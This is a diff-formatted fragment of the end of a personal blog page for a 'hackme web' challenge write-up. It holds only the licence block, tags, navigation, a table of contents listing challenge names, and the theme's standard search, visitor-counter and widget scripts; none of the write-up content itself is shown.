+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2019/02/14/hackme web wp/">hackme web wp</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 LJH 的个人博客">LJH</a></p>
+  <p><span>发布时间:</span>2019年02月14日 - 20:38</p>
+  <p><span>最后更新:</span>2019年02月14日 - 21:08</p>
+  <p><span>原始链接:</span><a href="/2019/02/14/hackme web wp/" title="hackme web wp">https://museljh.github.io/2019/02/14/hackme web wp/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://museljh.github.io/2019/02/14/hackme web wp/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+     
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------END-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql注入/" rel="tag"><i class="fa fa-tag"></i> sql注入</a>
+          
+            <a href="/tags/ssrf/" rel="tag"><i class="fa fa-tag"></i> ssrf</a>
+          
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
+          
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/13/upload-labs-writeup 11~15/" rel="next" title="upload-labs-writeup 11 ~ 15">
+                <i class="fa fa-chevron-left"></i> upload-labs-writeup 11 ~ 15
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/02/15/通过hackme中xss题目理解XSS所包含的巨大威力/" rel="prev" title="通过hackme中xss题目理解XSS所包含的巨大威力">
+                通过hackme中xss题目理解XSS所包含的巨大威力 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MjUxOC8xOTA2NQ=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="LJH">
+            
+              <p class="site-author-name" itemprop="name">LJH</p>
+              <p class="site-description motion-element" itemprop="description">一只web狗</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/MuseLJH" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1049135835@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/MuseLJHX" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-捉迷藏"><span class="nav-number">2.1.</span> <span class="nav-text">1.捉迷藏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-留言"><span class="nav-number">2.2.</span> <span class="nav-text">2.留言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-LFI"><span class="nav-number">2.3.</span> <span class="nav-text">3.LFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-主页"><span class="nav-number">2.4.</span> <span class="nav-text">4.主页</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-ping"><span class="nav-number">2.5.</span> <span class="nav-text">5.ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-记分牌"><span class="nav-number">2.6.</span> <span class="nav-text">6.记分牌</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-以管理员身份登录0"><span class="nav-number">2.7.</span> <span class="nav-text">7.    以管理员身份登录0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-以管理员身份登录0-1"><span class="nav-number">2.8.</span> <span class="nav-text">8.    以管理员身份登录0.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-以管理员身份登录1"><span class="nav-number">2.9.</span> <span class="nav-text">9.    以管理员身份登录1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-login-as-admin-1-2"><span class="nav-number">2.10.</span> <span class="nav-text">10.login as admin 1.2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-login-as-admin-3"><span class="nav-number">2.11.</span> <span class="nav-text">11.login as admin 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-login-as-admin-4"><span class="nav-number">2.12.</span> <span class="nav-text">12.login as admin 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-login-as-admin-6"><span class="nav-number">2.13.</span> <span class="nav-text">13.login as admin 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-login-as-admin-7"><span class="nav-number">2.14.</span> <span class="nav-text">14.login as admin 7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-login-as-admin-8"><span class="nav-number">2.15.</span> <span class="nav-text">15.login as admin 8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-login-as-admin-8-1"><span class="nav-number">2.16.</span> <span class="nav-text">16.login as admin 8.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-dafuq-manager-1"><span class="nav-number">2.17.</span> <span class="nav-text">17.    dafuq-manager 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#18-dafuq-manager-2"><span class="nav-number">2.18.</span> <span class="nav-text">18.    dafuq-manager 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#19-dafuq-manager-3"><span class="nav-number">2.19.</span> <span class="nav-text">19.dafuq-manager 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#20-wordpress-1"><span class="nav-number">2.20.</span> <span class="nav-text">20.wordpress 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#21-wordpress-1"><span class="nav-number">2.21.</span> <span class="nav-text">21.wordpress 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22-webshell"><span class="nav-number">2.22.</span> <span class="nav-text">22 .webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#23-command-executor"><span class="nav-number">2.23.</span> <span class="nav-text">23.command-executor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss"><span class="nav-number">2.24.</span> <span class="nav-text">xss</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'true') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("otYDWvApXTYxWRiyvbntKaiI-gzGzoHsz#<app_id>", "BGOUX1v4oeMfXIDWyV4dxdUt#<app_key>");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
